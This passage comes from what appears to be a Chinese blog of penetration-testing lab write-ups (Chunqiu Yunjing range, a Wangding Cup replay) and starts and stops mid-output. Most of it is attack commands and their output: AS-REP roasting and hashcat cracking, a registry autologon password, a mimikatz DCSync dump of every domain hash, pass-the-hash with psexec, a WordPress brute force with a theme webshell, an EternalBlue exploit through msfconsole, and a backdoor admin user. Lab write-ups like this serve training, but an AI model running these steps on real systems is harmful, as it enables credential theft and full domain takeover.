KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User zhufeng doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n~~~\n\nå¯ä»¥å¾—åˆ°äº†ä¸¤ä¸ªç”¨æˆ·çš„å¯†ç \n\n~~~\n$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa\n\n$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0\n\n~~~\n\nç”¨hashcatçˆ†ç ´ä¸€ä¸‹`â””â”€# hashcat -m 18200 passhash  /usr/share/wordlists/rockyou.txt`\n\n~~~\n$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa:hellokitty\n$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0:strawberry\n~~~\n\n`wenshao:hellokitty`ã€`zhangxin:strawberry`\n\nç”¨bloodhoundè¿›è¡Œä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# bloodhound-python -u zhangxin -p strawberry -d xiaorang.lab -dc DC-PROGAME.xiaorang.lab -c all --dns-tcp -ns 172.22.6.12 --auth-method ntlm --zip\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time2.png)\n\nå€Ÿä¸€å¼ å¤§ä½¬çš„å›¾ï¼Œå¯ä»¥çœ‹åˆ°WIN2019.XIAORANG.LABåˆ°YUXUAN@XIAORANG.LABæ˜¯æœ‰HasSessionçš„ï¼Œ\n\nHasSessionï¼šç”¨æˆ·ä¸è®¡ç®—æœºæ—¶è¿›è¡Œä¼šè¯æ—¶ï¼Œå‡­æ®ä¼šä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œè¯´æ˜yuxuanè¿™ä¸ªç”¨æˆ·ç™»å½•è¿‡WIN2019\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time3.png)\n\nå¯ä»¥ç›´æ¥æŸ¥çœ‹æ³¨å†Œè¡¨\n\n~~~\n\nC:\\Users\\zhangxin\\Desktop>reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n    AutoRestartShell    REG_DWORD    0x1\n    Background    REG_SZ    0 0 0\n    CachedLogonsCount    REG_SZ    10\n    DebugServerCommand    REG_SZ    no\n    DisableBackButton    REG_DWORD    0x1\n    EnableSIHostIntegration    REG_DWORD    0x1\n    ForceUnlockLogon    REG_DWORD    0x0\n    LegalNoticeCaption    REG_SZ\n    LegalNoticeText    REG_SZ\n    PasswordExpiryWarning    REG_DWORD    0x5\n    PowerdownAfterShutdown    REG_SZ    0\n    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}\n    ReportBootOk    REG_SZ    1\n    Shell    REG_SZ    explorer.exe\n    ShellCritical    REG_DWORD    0x0\n    ShellInfrastructure    REG_SZ    sihost.exe\n    SiHostCritical    REG_DWORD    0x0\n    SiHostReadyTimeOut    REG_DWORD    0x0\n    SiHostRestartCountLimit    REG_DWORD    0x0\n    SiHostRestartTimeGap    REG_DWORD    0x0\n    Userinit    REG_SZ    C:\\Windows\\system32\\userinit.exe,\n    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile\n    WinStationsDisabled    REG_SZ    0\n    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe\n    scremoveoption    REG_SZ    0\n    DisableCAD    REG_DWORD    0x1\n    LastLogOffEndTimePerfCounter    REG_QWORD    0xedd7ccd15\n    ShutdownFlags    REG_DWORD    0x80000027\n    AutoLogonSID    REG_SZ    S-1-5-21-3623938633-4064111800-2925858365-1180\n    LastUsedUsername    REG_SZ    yuxuan\n    AutoAdminLogon    REG_SZ    1\n    DefaultUserName    REG_SZ    yuxuan\n    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L\n    DefaultDomainName    REG_SZ    xiaorang.lab\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AlternateShells\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GPExtensions\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\UserDefaults\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoLogonChecked\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\VolatileUserMgrKey\n~~~\n\n~~~\n   DefaultUserName    REG_SZ    yuxuan\n    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L\n    DefaultDomainName    REG_SZ    xiaorang.lab\n~~~\n\nyuxuanç”¨æˆ·æ»¥ç”¨äº†SIDå†å²åŠŸèƒ½(SIDHistoryæ˜¯ä¸€ä¸ªä¸ºæ”¯æŒåŸŸè¿ç§»æ–¹æ¡ˆè€Œè®¾ç½®çš„å±æ€§ï¼Œå½“ä¸€ä¸ªå¯¹è±¡ä»ä¸€ä¸ªåŸŸè¿ç§»åˆ°å¦ä¸€ä¸ªåŸŸæ—¶ï¼Œä¼šåœ¨æ–°åŸŸåˆ›å»ºä¸€ä¸ªæ–°çš„SIDä½œä¸ºè¯¥å¯¹è±¡çš„objectSidï¼Œåœ¨ä¹‹å‰åŸŸä¸­çš„SIDä¼šæ·»åŠ åˆ°è¯¥å¯¹è±¡çš„sIDHistoryå±æ€§ä¸­ï¼Œæ­¤æ—¶è¯¥å¯¹è±¡å°†ä¿ç•™åœ¨åŸæ¥åŸŸçš„SIDå¯¹åº”çš„è®¿é—®æƒé™\n\nå…ˆç™»å½•yuxuanç”¨æˆ·ï¼Œç„¶åç”¨mimikatzæŠ“å–administratorçš„å“ˆå¸Œ\n\n~~~\nC:\\Users\\yuxuan\\Desktop>mimikatz.exe \"lsadump::dcsync /domain:xiaorang.lab /all /csv\" \"exit\"\n\n  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\n[DC] 'xiaorang.lab' will be the domain\n[DC] 'DC-PROGAME.xiaorang.lab' will be the DC server\n[DC] Exporting domain 'xiaorang.lab'\n1103    shuzhen 07c1f387d7c2cf37e0ca7827393d2327        512\n1104    gaiyong 52c909941c823dbe0f635b3711234d2e        512\n1106    xiqidi  a55d27cfa25f3df92ad558c304292f2e        512\n1107    wengbang        6b1d97a5a68c6c6c9233d11274d13a2e        512\n1108    xuanjiang       a72a28c1a29ddf6509b8eabc61117c6c        512\n1109    yuanchang       e1cea038f5c9ffd9dc323daf35f6843b        512\n1110    lvhui   f58b31ef5da3fc831b4060552285ca54        512\n1111    wenbo   9abb7115997ea03785e92542f684bdde        512\n1112    zhenjun 94c84ba39c3ece24b419ab39fdd3de1a        512\n1113    jinqing 4bf6ad7a2e9580bc8f19323f96749b3a        512\n1115    yangju  1fa8c6b4307149415f5a1baffebe61cf        512\n1117    weicheng        796a774eace67c159a65d6b86fea1d01        512\n1118    weixian 8bd7dc83d84b3128bfbaf165bf292990        512\n1119    haobei  045cc095cc91ba703c46aa9f9ce93df1        512\n1120    jizhen  1840c5130e290816b55b4e5b60df10da        512\n1121    jingze  3c8acaecc72f63a4be945ec6f4d6eeee        512\n1122    rubao   d8bd6484a344214d7e0cfee0fa76df74        512\n1123    zhaoxiu 694c5c0ec86269daefff4dd611305fab        512\n1124    tangshun        90b8d8b2146db6456d92a4a133eae225        512\n1125    liangliang      c67cd4bae75b82738e155df9dedab7c1        512\n1126    qiyue   b723d29e23f00c42d97dd97cc6b04bc8        512\n1127    chouqian        c6f0585b35de1862f324bc33c920328d        512\n1128    jicheng 159ee55f1626f393de119946663a633c        512\n1129    xiyi    ee146df96b366efaeb5138832a75603b        512\n1130    beijin  a587b90ce9b675c9acf28826106d1d1d        512\n1131    chenghui        08224236f9ddd68a51a794482b0e58b5        512\n1132    chebin  b50adfe07d0cef27ddabd4276b3c3168        512\n1133    pengyuan        a35d8f3c986ab37496896cbaa6cdfe3e        512\n1134    yanglang        91c5550806405ee4d6f4521ba6e38f22        512\n1135    jihuan  cbe4d79f6264b71a48946c3fa94443f5        512\n1136    duanmuxiao      494cc0e2e20d934647b2395d0a102fb0        512\n1137    hongzhi f815bf5a1a17878b1438773dba555b8b        512\n1138    gaijin  b1040198d43631279a63b7fbc4c403af        512\n1139    yifu    4836347be16e6af2cd746d3f934bb55a        512\n1140    fusong  adca7ec7f6ab1d2c60eb60f7dca81be7        512\n1141    luwan   c5b2b25ab76401f554f7e1e98d277a6a        512\n1142    tangrong        2a38158c55abe6f6fe4b447fbc1a3e74        512\n1143    zhufeng 71e03af8648921a3487a56e4bb8b5f53        512\n1145    dongcheng       f2fdf39c9ff94e24cf185a00bf0a186d        512\n1146    lianhuangchen   23dc8b3e465c94577aa8a11a83c001af        512\n1147    lili    b290a36500f7e39beee8a29851a9f8d5        512\n1148    huabi   02fe5838de111f9920e5e3bb7e009f2f        512\n1149    rangsibo        103d0f70dc056939e431f9d2f604683c        512\n1150    wohua   cfcc49ec89dd76ba87019ca26e5f7a50        512\n1151    haoguang        33efa30e6b3261d30a71ce397c779fda        512\n1152    langying        52a8a125cd369ab16a385f3fcadc757d        512\n1153    diaocai a14954d5307d74cd75089514ccca097a        512\n1154    lianggui        4ae2996c7c15449689280dfaec6f2c37        512\n1155    manxue  0255c42d9f960475f5ad03e0fee88589        512\n1156    baqin   327f2a711e582db21d9dd6d08f7bdf91        512\n1157    chengqiu        0d0c1421edf07323c1eb4f5665b5cb6d        512\n1158    louyou  a97ba112b411a3bfe140c941528a4648        512\n1159    maqun   485c35105375e0754a852cee996ed33b        512\n1160    wenbiao 36b6c466ea34b2c70500e0bfb98e68bc        512\n1161    weishengshan    f60a4233d03a2b03a7f0ae619c732fae        512\n1163    chuyuan 0cfdca5c210c918b11e96661de82948a        512\n1164    wenliang        a4d2bacaf220292d5fdf9e89b3513a5c        512\n1165    yulvxue cf970dea0689db62a43b272e2c99dccd        512\n1166    luyue   274d823e941fc51f84ea323e22d5a8c4        512\n1167    ganjian 7d3c39d94a272c6e1e2ffca927925ecc        512\n1168    pangzhen        51d37e14983a43a6a45add0ae8939609        512\n1169    guohong d3ce91810c1f004c782fe77c90f9deb6        512\n1170    lezhong dad3990f640ccec92cf99f3b7be092c7        512\n1171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b35        512\n1172    dujian  8f7846c78f03bf55685a697fe20b0857        512\n1173    lidongjin       34638b8589d235dea49e2153ae89f2a1        512\n1174    hongqun 6c791ef38d72505baeb4a391de05b6e1        512\n1175    yexing  34842d36248c2492a5c9a1ae5d850d54        512\n1176    maoda   6e65c0796f05c0118fbaa8d9f1309026        512\n1177    qiaomei 6a889f350a0ebc15cf9306687da3fd34        512\n502     krbtgt  a4206b127773884e2c7ea86cdd282d9c        514\n500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512\n1000    DC-PROGAME$     b1f83a8f5daf6f7825f6a69d98c8f364        532480\n1180    yuxuan  376ece347142d1628632d440530e8eed        66048\n1181    WIN2019$        5447da4f138ae51f887cf24e79a9eba3        4096\n1178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79        4260352\n1179    zhangxin        d6c5976e07cdb410be19b84126367e3d        4260352\n\nmimikatz(commandline) # exit\nBye!\n~~~\n\næœ‰äº†administratorçš„å¯†ç äº†ï¼Œå°±ç›¸å½“äºæ§åˆ¶åŸŸæ§äº†ï¼Œç™»å½•ä¸€ä¸‹å…¶ä»–çš„æœºå™¨type flagå°±è¡Œäº†\n\n# FLAG3ã€4\n\nflag03åœ¨172.22.6.25çš„C:\\Users\\Administrator\\flag\\ä¸‹\n\nflag04åœ¨172.22.6.12çš„C:\\Users\\Administrator\\flag\\ä¸‹\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-psexec  xiaorang.lab/administrator@172.22.6.12  -hashes :04d93ffd6f5f6e4490e0de23f240a5e9  -codec gbk\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Requesting shares on 172.22.6.12.....\n[*] Found writable share ADMIN$\n[*] Uploading file FFcjQxtS.exe\n[*] Opening SVCManager on 172.22.6.12.....\n[*] Creating service kiNB on 172.22.6.12.....\n[*] Starting service kiNB.....\n[!] Press help for extra shell commands\nMicrosoft Windows [ç‰ˆæœ¬ 10.0.14393]\n(c) 2016 Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚\n\nC:\\Windows\\system32> type C:\\Users\\Administrator\\flag\\flag*\n\n\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-psexec  xiaorang.lab/administrator@172.22.6.25  -hashes :04d93ffd6f5f6e4490e0de23f240a5e9  -codec gbk\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Requesting shares on 172.22.6.25.....\n[*] Found writable share ADMIN$\n[*] Uploading file GRqsuULo.exe\n[*] Opening SVCManager on 172.22.6.25.....\n[*] Creating service VUIl on 172.22.6.25.....\n[*] Starting service VUIl.....\n[!] Press help for extra shell commands\nMicrosoft Windows [ç‰ˆæœ¬ 10.0.17763.3046]\n(c) 2018 Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚\n\nC:\\Windows\\system32> type C:\\Users\\Administrator\\flag\\flag*\n~~~\n\n","tags":["é¶æœº"],"categories":["æ˜¥ç§‹äº‘é•œ"]},{"title":"æ˜¥ç§‹äº‘é•œ-2022ç½‘é¼æ¯åŠå†³èµ›å¤ç›˜","url":"/2025/04/02/æ˜¥ç§‹äº‘é•œ-2022ç½‘é¼æ¯åŠå†³èµ›å¤ç›˜/","content":"\n\n\n\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 39.98.112.16 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-02 02:06 EDT\nNmap scan report for 39.98.112.16\nHost is up (0.00020s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 135.21 seconds\n~~~\n\nåªå¼€äº†ä¸€ä¸ª 22 ç«¯å£å’Œ 80 ç«¯å£\n\nè®¿é—® 80 ç«¯å£ï¼Œå¾ˆæ˜æ˜¾çš„ wordpress æ¡†æ¶\n\nç”¨ wpscan æ‰«æå¯ä»¥æ‰«æåˆ°ä¸€ä¸ª admin ç”¨æˆ·ï¼Œçˆ†ç ´å¯†ç å¯ä»¥çˆ†ç ´å‡ºæ¥ admin çš„å¯†ç æ˜¯ 123456\n\n~~~\n[!] Valid Combinations Found:\n | Username: admin, Password: 123456\n~~~\n\nè¿›å…¥åå°ä¹‹åä¿®æ”¹ä¸»é¢˜æ–‡ä»¶ getshell\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%981.png)\n\nè®¿é—®/wp-content/themes/twentytwentyone/404.phpï¼Œèšå‰‘è¿æ¥\n\nflag01 åœ¨æ ¹ç›®å½•\n\næŸ¥çœ‹ç½‘ç»œä¿¡æ¯ï¼Œç„¶åä¸Šä¼  fscan è¿›è¡Œå†…ç½‘æ‰«æ\n\n~~~\n(www-data:/tmp) $ ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 :: 1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e: 2d: a8: bd brd ff: ff: ff: ff: ff: ff\n    inet 172.22.15.26/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 1892159075sec preferred_lft 1892159075sec\n    inet6 fe80:: 216:3eff: fe2d: a8bd/64 scope link \n       valid_lft forever preferred_lft forever\n~~~\n\n~~~\n$ ./fscan -h 172.22.15.26/16 -time 10\n ___                              _\n  / _ \\     _ __  __ _ _ __ __ _  _ __| | __\n / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /\n/ /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <\n\\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\\n                     fscan version: 1.8.2\nstart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 172.22.15.13    is alive\n(icmp) Target 172.22.15.18    is alive\n(icmp) Target 172.22.15.24    is alive\n(icmp) Target 172.22.15.35    is alive\n[*] Icmp alive hosts len is: 4\n172.22.15.24:3306 open\n172.22.15.35:445 open\n172.22.15.13:445 open\n172.22.15.18:445 open\n172.22.15.35:139 open\n172.22.15.24:139 open\n172.22.15.18:139 open\n172.22.15.13:139 open\n172.22.15.35:135 open\n172.22.15.24:135 open\n172.22.15.13:135 open\n172.22.15.18:135 open\n172.22.15.24:80 open\n172.22.15.18:80 open\n172.22.15.24:445 open\n172.22.15.13:88 open\n[*] alive ports len is: 16\nstart vulscan\n[*] NetInfo:\n[*]172.22.15.24\n   [->] XR-WIN08\n   [->] 172.22.15.24\n[*] NetInfo:\n[*]172.22.15.35\n   [->] XR-0687\n   [->] 172.22.15.35\n[*] NetBios: 172.22.15.35    XIAORANG\\XR-0687\n[*] NetInfo:\n[*]172.22.15.18\n   [->] XR-CA\n   [->] 172.22.15.18\n[*] NetInfo:\n[*]172.22.15.13\n   [->] XR-DC01\n   [->] 172.22.15.13\n[+] 172.22.15.24 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)\n[*] 172.22.15.13  (Windows Server 2016 Standard 14393)\n[*] NetBios: 172.22.15.13    [+]DC XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393\n[*] NetBios: 172.22.15.24    WORKGROUP\\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1\n[*] Webtoc: true\ntitle: http://172.22.15.18       code: 200 len: 703    toc: true\ntitle: IIS Windows Server\n[*] NetBios: 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393\n[*] Webtoc: true\ntitle: http://172.22.15.24       code: 302 len: 0      toc: true\ntitle: None è·³è½¬ url: http://172.22.15.24/www\n[*] Webtoc: true\ntitle: http://172.22.15.24/www/sys/index.php code: 200 len: 135    toc: true\ntitle: None\n[+] http://172.22.15.18 poc-yaml-active-directory-certsrv-detect\nå·²å®Œæˆ 16/16\n[*] æ‰«æç»“æŸ, è€—æ—¶: 23.238579924s\n~~~\n\nå¯ä»¥å‘ç° 172.22.15.24 å­˜åœ¨ MS17-010 æ¼æ´ï¼Œç›´æ¥ä¸Š msfï¼Œä½†æ˜¯ç”¨ msf æ¢­å“ˆä¹‹å‰éœ€è¦å…ˆæ­å»ºä¸€å±‚ä»£ç†ï¼Œå¯ä»¥ç”¨ Venom æ­å»ºå¾ˆæ–¹ä¾¿\n\n~~~\nproxychains msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset payload windows/x64/meterpreter/bind_tcp\nset rhosts 172.22.15.24\nexploit\n~~~\n\nflag02 åœ¨ C:\\\\users\\\\administrator\\\\flag é‡Œï¼Œæ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·ç„¶åè¿œç¨‹æ¡Œé¢è¿æ¥\n\n~~~\nnet user ll Asd123123 /add\nnet localgroup administrators ll /add\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%982.png)\n\nå¯ä»¥çœ‹åˆ°æ•°æ®åº“çš„å¯†ç ï¼Œè¿™ä¸ªç«™ç‚¹è¿˜å­˜åœ¨ä¸€ä¸ª phpmyadminï¼Œå°è¯•ç™»å½• `root:root@#123`ï¼Œå°† zdoo åº“é‡Œé¢çš„ user è¡¨å¯¼å‡ºæ¥\n\n~~~\n#åŸŸå†…ç”¨æˆ·\nlixiuying@xiaorang.lab\njiaxiaoliang@xiaorang.lab\nwanglihong@xiaorang.lab\nhuachunmei@xiaorang.lab\nzhangxinyu@xiaorang.lab\nhuzhigang@xiaorang.lab\nlihongxia@xiaorang.lab\nwangyulan@xiaorang.lab\nchenjianhua@xiaorang.lab\nzhangyi@xiaorang.lab\nzhangli@xiaorang.lab\nzhangwei@xiaorang.lab\nliuqiang@xiaorang.lab\nwangfang@xiaorang.lab\nwangwei@xiaorang.lab\nlixiaoliang@xiaorang.lab\nwanghao@xiaorang.lab\n~~~\n\nå°†è·å¾—çš„è´¦å·æ”¾è¿› user.txt é‡Œ\n\nä½¿ç”¨ AS-REP Roasting æ”»å‡»ï¼Œå°è¯•è·å–ç”¨æˆ·çš„å¯†ç \n\n~~~â€˜â€™\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.15.13 -usersfile users.txt -format hashcat\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n/usr/share/doc/python3-impacket/examples/GetNPUsers.py: 165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)\n$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:28dc48860e014c6d18a29bad65ba6cc8$ b6924f808e7a4d56bd403bc0e5286ad6b1cb1a39ee59331e484a90801fa82bbcb6b685236b61c5976a05330006b74f304fcfb56793de9c78d38caa16075bef947ad898c8b1130dad240a8298a98e86f18af90cebb015502c7758d6a32c366a42395d08877902d303ee0662540653b3c87c14d6d5319b63e5c5eaf6250d7e82d48d57afc56492344b618b054d6a75cf5ee014f00e92311479dba0ccb54c77b072213a42b79862f913a77a6b0fae4f9a67755ca83b583220c30b6f77296098c71bb42a2cbd8197bcd4e30598ecfbf519899b44cc5d723a4a49fc26db1a4b678a1afd4acea4b42b72949e677edd\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:2fad79d14745c573303bd34c39f80e7f$ 0d9522fc4669f0e04b80e36cef3370c1cce5e232e2b131d6d652c7e2dad452a86918cfbd25e78a701896943ba6b50e241f27b8af4b5d79cffef11fd4ee2392325a468f8ff648e70a74e7d9d2ce58990dc91b36a5c84c2ffa7f45e7cdd852dc2a8df1e5e2f9491eb5c5753cdf54cac6cc2eed2a8b9b58c3693b058fcb6a6187ae49c4d80732aa40e0e3296313962128d414b85f75cb87af301ca39664fffc192e1b62755178c4c6b8f13dd70ff912c4f637a970f33bc367e84e4c1dcb31ade4a20b0bdf8bd7c64c19adf091f4850a8ea2c7a7428bbcb17ef7c87e02ae3b5f9637902612ba8fbe65b7599a7d7e\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User lihongxia@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User wangyulan@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User 